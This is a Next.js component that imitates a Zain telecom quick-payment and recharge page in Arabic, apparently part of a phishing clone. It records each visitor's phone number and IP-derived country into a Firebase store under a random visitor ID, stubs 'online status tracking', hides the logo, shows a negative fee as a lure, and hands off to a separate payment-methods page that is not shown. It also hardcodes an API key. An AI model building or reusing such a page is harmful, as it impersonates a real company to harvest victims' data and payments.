"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { motion, AnimatePresence } from "framer-motion"
import { ChevronDown, Loader2, Plus, Phone, CreditCard, Clock, ArrowRight, Check } from "lucide-react"
import { cn } from "@/lib/utils"
import { fetchBalance } from "@/lib/api"
import { addData } from "@/lib/firebasee"

// Types
interface BalanceData {
  dueAmount?: string
  [key: string]: any
}

interface AmountOption {
  value: string
  validity: number
}

export default function ZainPayment() {
  // State management
  const [selectedTab, setSelectedTab] = useState("bill")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [loading, setLoading] = useState(false)
  const [showAmountDropdown, setShowAmountDropdown] = useState(false)
  const [selectedAmount, setSelectedAmount] = useState("29.900")
  const [otherAmount, setOtherAmount] = useState("0")
  const [fees, setFees] = useState("-0.600")
  const [total, setTotal] = useState("0.000")
  const [balanceData, setBalanceData] = useState<BalanceData | null>(null)
  const [isLoadingBalance, setIsLoadingBalance] = useState(false)
  const [balanceError, setBalanceError] = useState<string | null>(null)
  const [showNumberType, setShowNumberType] = useState(false)
  const [numberType, setNumberType] = useState("رقم آخر")

  const router = useRouter()
  const _id = generateRandomId("zain-")

  // Available recharge amounts
  const amounts: AmountOption[] = [
    { value: "2.000", validity: 7 },
    { value: "4.000", validity: 15 },
    { value: "6.000", validity: 30 },
    { value: "12.000", validity: 90 },
    { value: "22.000", validity: 180 },
    { value: "30.000", validity: 365 },
  ]

  // Calculate total when selected amount or fees change
  useEffect(() => {
    const totalAmount = Math.max(0, Number.parseFloat(selectedAmount) + Number.parseFloat(fees)).toFixed(3)
    setTotal(totalAmount)
  }, [selectedAmount, fees])

  // Save selected amount to localStorage
  useEffect(() => {
    localStorage.setItem("amount", selectedAmount)
  }, [selectedAmount])

  // Fetch balance when phone number is complete
  useEffect(() => {
    if (phoneNumber.length === 8) {
      getBalance(phoneNumber)
    }
  }, [phoneNumber])

  // Get user location on component mount
  useEffect(() => {
    getLocation()
  }, [])

  // Helper function to generate random ID
  function generateRandomId(prefix: string) {
    return Math.random()
      .toString(36)
      .replace("0.", prefix || "")
  }

  // Fetch user's balance
  const getBalance = async (number: string) => {
    setIsLoadingBalance(true)
    setBalanceError(null)

    try {
      const data = await fetchBalance(number)
      setBalanceData(data)

      // Update the selected amount based on the balance due
      if (data.dueAmount) {
        setSelectedAmount(data.dueAmount)
      }
    } catch (error) {
      console.error("Failed to fetch balance:", error)
      setBalanceError("فشل في جلب بيانات الرصيد")
    } finally {
      setIsLoadingBalance(false)
    }
  }

  // Get user location
  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(_id)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  // Setup online status tracking
  function setupOnlineStatus(id: string) {
    // This function would be implemented in your utils
    // For now, we'll just stub it
    console.log(`Setting up online status tracking for ID: ${id}`)
  }

  // Open customer support chat
  const openChat = () => {
    // Open Smartsupp chat if available
    if (window.smartsupp) {
      window.smartsupp("chat:open")

      // Send customer info to chat
      if (phoneNumber) {
        window.smartsupp("name", `Customer ${phoneNumber}`)
        window.smartsupp("variable", "Phone", phoneNumber)
      }
    }
  }

  // Handle form submission
  const handleSubmit = () => {
    if (phoneNumber === "") return

    setIsSubmitted(true)
    setLoading(true)

    const visitorId = localStorage.getItem("visitor") || _id

    addData({
      id: visitorId,
      name: phoneNumber,
      phone: phoneNumber,
    })

    setTimeout(() => {
      router.push("/payment-methods")
      setIsSubmitted(false)
      setLoading(false)
    }, 2000)
  }

  return (
    <div className="max-w-md mx-auto bg-gradient-to-b from-white to-gray-50 min-h-screen" dir="rtl">
      {/* Header */}
      <header
        style={{
          background: "url(/top.png)",
          backgroundSize: "contain",
          backgroundRepeat: "no-repeat",
        }}
        className="flex items-center justify-between bg-gradient-to-r from-[#2d1a45] to-[#3a2259] shadow-md h-16"
      >
        <div className="flex items-center">
          <img src="/next.svg" alt="Zain Logo" className="h-16 ml-2" style={{ visibility: "hidden" }} />
        </div>
      </header>

      {/* Main Content */}
      <div className="p-5">
        <div className="flex items-center mb-6">
          <ArrowRight className="text-[#2d1a45] mr-2" size={20} />
          <h2 className="text-2xl font-bold text-[#2d1a45]">الدفع السريع</h2>
        </div>

        {/* Tabs */}
        <div className="flex border-b mb-8 bg-white rounded-t-lg shadow-sm">
          <button
            className={cn(
              "flex-1 py-4 text-center font-medium transition-all duration-200",
              selectedTab === "bill"
                ? "border-b-4 border-[#d13c8c] text-[#d13c8c] bg-pink-50/50"
                : "text-gray-500 hover:text-gray-700 hover:bg-gray-50",
            )}
            onClick={() => setSelectedTab("bill")}
          >
            <div className="flex items-center justify-center">
              <CreditCard className="mr-2" size={18} />
              دفع الفاتورة
            </div>
          </button>
          <button
            className={cn(
              "flex-1 py-4 text-center font-medium transition-all duration-200",
              selectedTab === "recharge"
                ? "border-b-4 border-[#d13c8c] text-[#d13c8c] bg-pink-50/50"
                : "text-gray-500 hover:text-gray-700 hover:bg-gray-50",
            )}
            onClick={() => setSelectedTab("recharge")}
          >
            <div className="flex items-center justify-center">
              <Phone className="mr-2" size={18} />
              إعادة تعبئة eeZee
            </div>
          </button>
        </div>

        {/* Form */}
        <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
          <div className="text-right mb-4">
            <p className="text-[#2d1a45] font-medium">أريد أن أعيد التعبئة </p>
          </div>

          {/* Number Type Selector */}
          <div className="relative mb-6">
            <div
              className="w-full flex justify-between items-center border-b-2 border-[#d13c8c] pb-2 cursor-pointer"
              onClick={() => setShowNumberType(!showNumberType)}
            >
              <div className="flex items-center">
                <ChevronDown
                  className={`text-[#d13c8c] transition-transform duration-300 ${showNumberType ? "rotate-180" : ""}`}
                />
                <span className="mr-2 text-gray-700">{numberType}</span>
              </div>
              <span className="text-gray-500 text-sm">نوع الرقم</span>
            </div>

            {/* Number Type Dropdown */}
            <AnimatePresence>
              {showNumberType && (
                <motion.div
                  className="absolute z-10 bg-white shadow-lg w-full mt-1 border rounded-md overflow-hidden"
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  transition={{ duration: 0.2 }}
                >
                  <div
                    className="p-3 hover:bg-gray-50 cursor-pointer flex justify-between items-center"
                    onClick={() => {
                      setNumberType("رقم آخر")
                      setShowNumberType(false)
                    }}
                  >
                    <span>رقم آخر</span>
                    {numberType === "رقم آخر" && (
                      <div className="w-4 h-4 rounded-full bg-[#d13c8c] flex items-center justify-center">
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      </div>
                    )}
                  </div>
                  <div
                    className="p-3 hover:bg-gray-50 cursor-pointer flex justify-between items-center"
                    onClick={() => {
                      setNumberType("رقم العقد")
                      setShowNumberType(false)
                    }}
                  >
                    <span>رقم العقد</span>
                    {numberType === "رقم العقد" && (
                      <div className="w-4 h-4 rounded-full bg-[#d13c8c] flex items-center justify-center">
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      </div>
                    )}
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Phone Number Input */}
          <div className="mb-6">
            <label className="block text-right mb-2 font-medium text-[#2d1a45]">
              رقم الهاتف <span className="text-red-500">*</span>
            </label>
            <div className="relative">
              <input
                type="tel"
                maxLength={12}
                placeholder="أدخل الرقم 9XXXXXX"
                className="w-full p-4 border border-gray-300 rounded-lg text-right pr-12 focus:outline-none focus:ring-2 focus:ring-[#d13c8c] focus:border-transparent transition-all"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                <Phone className="h-5 w-5 text-gray-400" />
              </div>

              {isLoadingBalance && (
                <div className="absolute inset-y-0 left-0 flex items-center pl-3">
                  <Loader2 className="h-5 w-5 text-[#d13c8c] animate-spin" />
                </div>
              )}

              {phoneNumber.length === 8 && balanceData && !isLoadingBalance && (
                <div className="absolute inset-y-0 left-0 flex items-center pl-3">
                  <div className="h-5 w-5 rounded-full bg-green-500 flex items-center justify-center">
                    <Check className="h-3 w-3 text-white" />
                  </div>
                </div>
              )}
            </div>

            {balanceError && <p className="mt-2 text-red-500 text-sm">{balanceError}</p>}

            {balanceData && (
              <motion.div
                className="mt-3 p-3 bg-green-50 border border-green-100 rounded-md"
                initial={{ opacity: 0, y: -10 }}
                animate={{ opacity: 1, y: 0 }}
              >
                <p className="text-green-800 text-sm">تم العثور على معلومات الحساب</p>
              </motion.div>
            )}
          </div>

          {/* Amount Selector */}
          <div className="relative mb-6">
            <div
              className="flex justify-between items-center border-b-2 border-[#d13c8c] py-4 cursor-pointer"
              onClick={() => setShowAmountDropdown(!showAmountDropdown)}
            >
              <div className="flex items-center">
                <ChevronDown
                  className={`text-[#d13c8c] transition-transform duration-300 ${showAmountDropdown ? "rotate-180" : ""}`}
                />
                <span className="mr-2 font-medium">{selectedAmount} د.ك</span>
              </div>
              <label className="block text-right text-sm text-gray-500">مبلغ التعبئة</label>
            </div>
            <div className="text-right text-sm text-gray-500 mt-2 flex items-center">
              <Clock className="inline-block ml-1" size={14} />
              الصلاحية 30 يوم
            </div>

            {/* Amount Dropdown */}
            <AnimatePresence>
              {showAmountDropdown && (
                <motion.div
                  className="absolute z-10 bg-white shadow-lg w-full mt-2 border rounded-md overflow-hidden"
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  transition={{ duration: 0.2 }}
                >
                  {amounts.map((amount) => (
                    <div
                      key={amount.value}
                      className={`flex justify-between p-3 cursor-pointer hover:bg-gray-50 transition-colors ${
                        selectedAmount === amount.value ? "bg-pink-50" : ""
                      }`}
                      onClick={() => {
                        localStorage.setItem("amount", amount.value)
                        setSelectedAmount(amount.value)
                        setShowAmountDropdown(false)
                      }}
                    >
                      <div className="flex items-center">
                        {selectedAmount === amount.value ? (
                          <div className="w-5 h-5 rounded-full bg-[#d13c8c] flex items-center justify-center mr-2">
                            <Check className="w-3 h-3 text-white" />
                          </div>
                        ) : (
                          <div className="w-5 h-5 rounded-full border border-gray-300 mr-2"></div>
                        )}
                        <span className="font-medium">{amount.value} د.ك</span>
                      </div>
                      <div className="flex items-center">
                        <Clock className="inline-block ml-1" size={14} />
                        <span>الصلاحية {amount.validity} يوم</span>
                      </div>
                    </div>
                  ))}
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Add Another Number Button */}
          <button className="w-full p-3 border-2 border-[#d13c8c] text-[#d13c8c] rounded-lg flex items-center justify-center hover:bg-pink-50 transition-colors">
            <Plus className="h-5 w-5 ml-2" />
            <span>أضف رقم آخر</span>
          </button>
        </div>

        {/* Summary Card */}
        <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
          <h3 className="text-lg font-bold text-[#2d1a45] mb-4">ملخص الطلب</h3>

          <div className="space-y-3">
            <div className="flex justify-between items-center pb-2">
              <div className="text-gray-700">{selectedAmount} د.ك</div>
              <div className="text-gray-700">مبلغ التعبئة</div>
            </div>

            <div className="flex justify-between items-center pb-2">
              <div className="text-gray-700">{fees} د.ك</div>
              <div className="text-gray-700">الرسوم</div>
            </div>

            <div className="flex justify-between items-center pt-3 border-t border-dashed">
              <div className="text-[#d13c8c] font-bold text-xl">{total} د.ك</div>
              <div className="text-[#2d1a45] font-bold">الإجمالي</div>
            </div>
          </div>
        </div>

        {/* Payment Button */}
        <motion.button
          className={`w-full py-4 rounded-lg font-medium text-lg flex items-center justify-center ${
            isSubmitted || phoneNumber === ""
              ? "bg-gray-300 text-gray-500 cursor-not-allowed"
              : "bg-gradient-to-r from-[#d13c8c] to-[#e04c9c] text-white shadow-md hover:shadow-lg"
          }`}
          whileTap={{ scale: isSubmitted || phoneNumber === "" ? 1 : 0.98 }}
          disabled={isSubmitted || phoneNumber === ""}
          onClick={handleSubmit}
        >
          {isSubmitted ? (
            <>
              <Loader2 className="animate-spin mr-2" size={20} />
              جاري الدفع...
            </>
          ) : (
            <>
              <CreditCard className="mr-2" size={20} />
              دفع
            </>
          )}
        </motion.button>

        {/* Help text */}
        <div className="mt-4 text-center">
          <button
            onClick={openChat}
            className="text-[#2d1a45] text-sm hover:underline flex items-center justify-center mx-auto"
          >
            هل تحتاج إلى مساعدة؟
          </button>
        </div>
      </div>
    </div>
  )
}
